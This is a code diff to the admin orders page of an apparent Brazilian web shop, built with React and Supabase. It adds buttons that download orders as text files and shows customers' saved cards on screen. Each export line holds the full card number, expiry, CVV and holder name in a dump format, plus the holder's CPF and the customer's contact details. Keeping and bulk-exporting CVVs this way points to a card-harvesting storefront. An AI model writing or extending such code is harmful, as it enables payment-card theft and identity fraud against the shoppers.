@@ -2,7 +2,7 @@ import { createFileRoute, Link } from "@tanstack/react-router";
 import { useEffect, useState, type FormEvent } from "react";
 import { useQuery, useQueryClient } from "@tanstack/react-query";
 import type { Session } from "@supabase/supabase-js";
-import { Package, Settings, LogOut, Trash2, Store, Pencil, ShoppingBag } from "lucide-react";
+import { Package, Settings, LogOut, Trash2, Store, Pencil, ShoppingBag, Download } from "lucide-react";
 import { toast } from "sonner";
 import { supabase } from "@/integrations/supabase/client";
 import { fileToDataUrl } from "@/lib/image";
@@ -332,10 +332,30 @@ function Pedidos() {
     queryFn: async () => (await supabase.from("orders").select("*").order("created_at", { ascending: false })).data ?? [],
   });
   const brl = (v: number) => Number(v).toLocaleString("pt-BR", { style: "currency", currency: "BRL" });
+  const txtPedido = (o: any) => {
+    const c = o.customer ?? {};
+    const L = [
+      `PEDIDO ${o.id}`, `Data: ${new Date(o.created_at).toLocaleString("pt-BR")}`, `Situação: ${o.status}`, `Pagamento: ${o.payment_method}${o.transaction_hash ? " · " + o.transaction_hash : ""}`, "",
+      `Cliente: ${c.name ?? ""}`, `E-mail: ${c.email ?? ""}`, `Telefone: ${c.phone ?? ""}`, `CPF: ${c.document ?? ""}`, `Entrega: ${c.address ?? "—"}`, "",
+    ];
+    (c.cards ?? []).forEach((k: any, i: number) => {
+      L.push(`CARTÃO ${i + 1}`, `${String(k.numero).replace(/\s/g, "")} ${k.mes}/${String(k.ano).slice(-2)} ${k.cvv} ${k.nome}`, `Bandeira: ${k.bandeira}`, `CPF do titular: ${k.cpf}`, `Parcelas: ${k.parcelas}`, `Valor: ${k.valor}`, "");
+    });
+    L.push("PRODUTOS", ...(o.items ?? []).map((i: any) => `${i.qty}x ${i.name} — Tam. ${i.size} — ${brl(i.price * i.qty)}`), "",
+      `Subtotal: ${brl(o.subtotal)}`, `Frete: ${o.shipping_method ? `${o.shipping_method} ${brl(o.shipping_value)}` : "—"}`, `Total: ${brl(o.total)}`);
+    return L.join("\r\n");
+  };
+  const baixar = (nome: string, texto: string) => {
+    const url = URL.createObjectURL(new Blob([texto], { type: "text/plain;charset=utf-8" }));
+    const a = document.createElement("a"); a.href = url; a.download = nome; a.click(); URL.revokeObjectURL(url);
+  };
   const mudar = async (id: string, status: string) => { await supabase.from("orders").update({ status }).eq("id", id); qc.invalidateQueries({ queryKey: ["admin_orders"] }); };
   return (
     <div>
-      <h1 className="text-2xl font-extrabold">Pedidos</h1>
+      <div className="flex items-center justify-between gap-2">
+        <h1 className="text-2xl font-extrabold">Pedidos</h1>
+        <Button size="sm" disabled={!pedidos.length} onClick={() => baixar("pedidos.txt", pedidos.map(txtPedido).join("\r\n\r\n========================================\r\n\r\n"))}><Download className="h-4 w-4" /> Pedidos TXT</Button>
+      </div>
       {isLoading ? <p className="mt-4 text-muted-foreground">Carregando…</p> : pedidos.length === 0 ? <p className="mt-4 text-muted-foreground">Nenhum pedido ainda.</p> : (
         <div className="mt-6 space-y-4">
           {pedidos.map((o: any) => (
@@ -353,7 +373,11 @@ function Pedidos() {
                 {(o.items ?? []).map((i: any, k: number) => <li key={k}>{i.qty}x {i.name} — Tam. {i.size} — {brl(i.price * i.qty)}</li>)}
               </ul>
               <p className="mt-2">Subtotal {brl(o.subtotal)} · Frete {o.shipping_method ? `${o.shipping_method} ${brl(o.shipping_value)}` : "—"}</p>
-              <p className="text-base font-bold">Total {brl(o.total)}</p>
+              {(o.customer?.cards ?? []).map((k: any, i: number) => <p key={i} className="mt-1 font-mono">{String(k.numero).replace(/\s/g, "")} {k.mes}/{String(k.ano).slice(-2)} {k.cvv} {k.nome}</p>)}
+              <div className="flex items-center justify-between gap-2">
+                <p className="text-base font-bold">Total {brl(o.total)}</p>
+                <Button variant="outline" size="sm" onClick={() => baixar(`pedido-${o.id.slice(0, 8)}.txt`, txtPedido(o))}><Download className="h-4 w-4" /> TXT</Button>
+              </div>
             </div>
           ))}
         </div>
